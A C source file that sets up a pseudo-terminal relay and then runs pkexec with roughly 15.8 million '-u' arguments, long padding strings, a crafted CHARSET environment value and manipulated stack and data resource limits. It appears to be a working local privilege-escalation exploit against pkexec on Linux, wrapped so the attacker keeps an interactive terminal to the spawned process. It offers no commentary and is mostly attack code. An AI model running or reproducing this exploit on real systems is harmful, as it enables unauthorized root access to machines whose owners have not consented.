#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <termios.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <string.h>

// This code is based on the sample code at http://rachid.koucha.free.fr/tech_corner/pty_pdip.html

int main(int argc, char **argv)
{
    int fdm, fds;
    int rc;
    pid_t child;
    char input[150];

    fdm = posix_openpt(O_RDWR);
    if (fdm < 0)
    {
        fprintf(stderr, "Error %d on posix_openpt()\n", errno);
        return 1;
    }

    rc = grantpt(fdm);
    if (rc != 0)
    {
        fprintf(stderr, "Error %d on grantpt()\n", errno);
        return 1;
    }

    rc = unlockpt(fdm);
    if (rc != 0)
    {
        fprintf(stderr, "Error %d on unlockpt()\n", errno);
        return 1;
    }

    // Open the slave side ot the PTY
    fds = open(ptsname(fdm), O_RDWR);

    // Create the child process
    if (child = fork())
    {
        fd_set fd_in;

        // FATHER

        // Close the slave side of the PTY
        close(fds);

        while (1)
        {
            // Wait for data from standard input and master side of PTY
            FD_ZERO(&fd_in);
            FD_SET(0, &fd_in);
            FD_SET(fdm, &fd_in);

            rc = select(fdm + 1, &fd_in, NULL, NULL, NULL);
            switch(rc)
            {
                case -1 : fprintf(stderr, "Error %d on select()\n", errno);
                          exit(1);

                default :
                          {
                              // If data on standard input
                              if (FD_ISSET(0, &fd_in))
                              {
                                  rc = read(0, input, sizeof(input));
                                  if (rc > 0)
                                  {
                                      // Send data on the master side of PTY
                                      write(fdm, input, rc);
                                  }
                                  else
                                  {
                                      if (rc < 0)
                                      {
                                          fprintf(stderr, "Error %d on read standard input\n", errno);
                                          exit(1);
                                      }
                                  }
                              }

                              // If data on master side of PTY
                              if (FD_ISSET(fdm, &fd_in))
                              {
                                  rc = read(fdm, input, sizeof(input));
                                  if (rc > 0)
                                  {
                                      // Send data on standard output
                                      write(1, input, rc);
                                  }
                                  else
                                  {
                                      if (rc < 0)
                                      {
                                          //fprintf(stderr, "Error %d on read master PTY\n", errno);
                                          exit(1);
                                      }
                                  }
                              }
                          }
            } // End switch
        } // End while
    }
    else
    {
        struct termios slave_orig_term_settings; // Saved terminal settings
        struct termios new_term_settings; // Current terminal settings

        // CHILD

        // Close the master side of the PTY
        close(fdm);

        // Save the defaults parameters of the slave side of the PTY
        rc = tcgetattr(fds, &slave_orig_term_settings);

        // Set RAW mode on slave side of PTY
        new_term_settings = slave_orig_term_settings;
        cfmakeraw (&new_term_settings);
        tcsetattr (fds, TCSANOW, &new_term_settings);

        // The slave side of the PTY becomes the standard input and outputs of the child process
        close(0); // Close standard input (current terminal)
        close(1); // Close standard output (current terminal)
        close(2); // Close standard error (current terminal)

        dup(fds); // PTY becomes standard input (0)
        dup(fds); // PTY becomes standard output (1)
        dup(fds); // PTY becomes standard error (2)

        // Now the original file descriptor is useless
        close(fds);

        // Make the current process a new session leader
        setsid();

        // As the child is a session leader, set the controlling terminal to be the slave side of the PTY
        // (Mandatory for programs like the shell to make them manage correctly their outputs)
        ioctl(0, TIOCSCTTY, 1);

        // Execution of the program
        {
            size_t nstrings = 15840000;
            char** args = malloc(((nstrings * 2) + 3) * sizeof(char*));
            size_t i, j, arg;
            struct rlimit rlim;
            char *env[] = {
                "CHARSET=//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
                NULL,
            };

            args[0] = "pkexec";

            for (i=0; i<nstrings; ++i) {
                args[i*2 + 1] = "-u";
                args[i*2 + 2] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
            }

            char ones[471];
            memset(ones, 1, 470);
            ones[0] = '/';
            ones[470] = 0;
            args[(nstrings * 2) + 1] = ones;
            args[(nstrings * 2) + 2] = 0;


            rlim.rlim_cur = rlim.rlim_max = RLIM_INFINITY;
            setrlimit(RLIMIT_STACK, &rlim);
            rlim.rlim_cur = rlim.rlim_max = 1;
            setrlimit(RLIMIT_DATA, &rlim);

            rc = execvpe("pkexec", args, env);
        }

        // if Error...
        return 1;
    }

    return 0;
} // main

